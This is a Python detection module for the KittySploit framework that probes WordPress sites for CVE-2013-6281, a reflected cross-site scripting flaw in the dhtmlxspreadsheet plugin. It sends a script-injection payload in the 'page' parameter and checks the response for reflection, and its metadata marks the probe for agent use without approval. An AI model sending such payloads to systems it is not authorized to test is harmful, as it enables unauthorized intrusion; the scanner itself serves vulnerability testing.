#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Spreadsheet plugin contains a reflected cross-site scripting vulnerability in /dhtmlxspreadsheet/cod."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Spreadsheet - Cross-Site Scripting Detection',
        'description': 'WordPress Spreadsheet plugin contains a reflected cross-site scripting vulnerability in /dhtmlxspreadsheet/codebase/spreadsheet.php.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2013', 'cve', 'wp', 'wpscan', 'wordpress', 'xss', 'wp-plugin', 'dhtmlx', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/49785932-f4e0-4aaa-a86c-4017890227bf',
            'https://wordpress.org/plugins/dhtmlxspreadsheet/',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6281',
            'https://nvd.nist.gov/vuln/detail/CVE-2013-6281',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2013-6281',
    }

    def run(self):
        path = '/wp-content/plugins/dhtmlxspreadsheet/codebase/spreadsheet.php?page=%3Cscript%3Ealert(document.domain)%3C/script%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ("page: '<script>alert(document.domain)</script>'", 'dhx_rel_path',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress Spreadsheet - Cross-Site Scripting detected', path=path)
            return True
        return False

